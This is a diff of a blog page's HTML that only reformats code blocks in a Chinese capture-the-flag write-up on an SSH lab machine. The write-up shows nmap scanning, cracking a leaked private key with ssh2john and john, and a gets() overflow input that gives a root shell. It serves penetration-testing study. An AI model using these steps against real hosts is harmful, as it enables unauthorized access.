@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      567 字
+      569 字
     </span>
   
 
@@ -216,7 +216,6 @@
   <main>
     
       
-
 <div class="container-fluid nopadding-x">
   <div class="row nomargin-x">
     <div class="d-none d-lg-block col-lg-2"></div>
@@ -236,12 +235,13 @@
 <h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><ol>
 <li><p>寻找靶机IP</p>
 <p>可以使用<code>netdiscover</code>或者 <code>nmap</code>进行IP扫描</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">netdiscover 10.112.132.0/24<br>nmap 10.112.132.0/24<br></code></pre></td></tr></table></figure></li>
+<div class="code-wrapper"><pre><code class="hljs shell">netdiscover 10.112.132.0/24
+nmap 10.112.132.0/24</code></pre></div></li>
 </ol>
 <ol start="2">
 <li><p>扫描服务</p>
 <p>因为是使用了nmap进行了扫描IP , 所以顺便把服务也一起扫描了</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -A -T4 10.112.132.16<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs shell">nmap -A -T4 10.112.132.16</code></pre></div>
 
 <p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/nmap.jpg?raw=true" srcset="/Study/img/loading.gif" lazyload alt="nmap.jpg"></p>
 </li>
@@ -269,19 +269,21 @@
 <ol start="2">
 <li><p>私钥</p>
 <p>尝试使用公钥登录 , 提示没权限</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -i id_rsa simon@10.112.132.16<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs shell">ssh -i id_rsa simon@10.112.132.16</code></pre></div>
 
 <p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Permission_Denied.jpg?raw=true" srcset="/Study/img/loading.gif" lazyload alt="Permission_Denied"></p>
 <p>​</p>
 <p>修改权限 , 再次尝试登录 , 提示需要密码</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 600 id_rsa<br>ssh -i id_rsa simon@10.112.132.16<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs shell">chmod 600 id_rsa
+ssh -i id_rsa simon@10.112.132.16</code></pre></div>
 
 <p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/SSH_login_not_password.jpg?raw=true" srcset="/Study/img/loading.gif" lazyload alt="SSH_login_not_password"></p>
 <p>​</p>
 </li>
 <li><p>破解私钥</p>
 <p>使用<code>ssh2john</code>对 id_rsa 秘钥信息转为 John可以识别的信息 , 让使用zcat 破解isacrack 信息</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/share/john/ssh2john.py id_rsa &gt; isacrack<br>zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules isacrack<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs shell">/usr/share/john/ssh2john.py id_rsa &gt; isacrack
+zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules isacrack</code></pre></div>
 
 <p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Zcat&Join.jpg?raw=true" srcset="/Study/img/loading.gif" lazyload alt="Zcat&amp;Join"></p>
 <p>破解出密码为: <code>starwars</code> , 再次登录</p>
@@ -293,11 +295,11 @@
 <p>在root 目录下 有个 <code>flag.txt</code>与 ‘read_message.c’  , flag.txt没权限打开 , read_message.c查看发现第二个flag  , 且提示我们需要执行这个源码</p>
 <p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Flag2.jpg?raw=true" srcset="/Study/img/loading.gif" lazyload alt="Flag2"></p>
 <p>查找已经编译的程序,并执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shel">find / -name &quot;*read_message*&quot; 2&gt;/dev/null<br></code></pre></td></tr></table></figure></li>
+<div class="code-wrapper"><pre><code class="hljs shel">find / -name &quot;*read_message*&quot; 2&gt;/dev/null</code></pre></div></li>
 </ol>
 <h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>​    这个程序是一个简单的溢出攻击(然而我不会 (汗颜)),直接照搬<code>TelCruel</code>的WP了</p>
-<pre><code> 这里因为gets（buf）没有限制读取的长度，但是buf[]这个数组只能储存20个字符，那么超过20个字符的就会存入缓冲区，将后面的内容覆盖。然后当执行到execve的时候原来要执行program[]内的字符，被覆盖后就可以利用了。所以只要输入SimonAAAAAAAAAAAAAAA/bin/sh,即可进入root的shell
-</code></pre>
+<div class="code-wrapper"><pre><code> 这里因为gets（buf）没有限制读取的长度，但是buf[]这个数组只能储存20个字符，那么超过20个字符的就会存入缓冲区，将后面的内容覆盖。然后当执行到execve的时候原来要执行program[]内的字符，被覆盖后就可以利用了。所以只要输入SimonAAAAAAAAAAAAAAA/bin/sh,即可进入root的shell
+</code></pre></div>
 <p>​    执行后 , 权限提升至root , 查看flag.txt 得到 第三个Flag</p>
 <p>​    <img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/flag3.jpg?raw=true" srcset="/Study/img/loading.gif" lazyload alt="Flag3"></p>
 
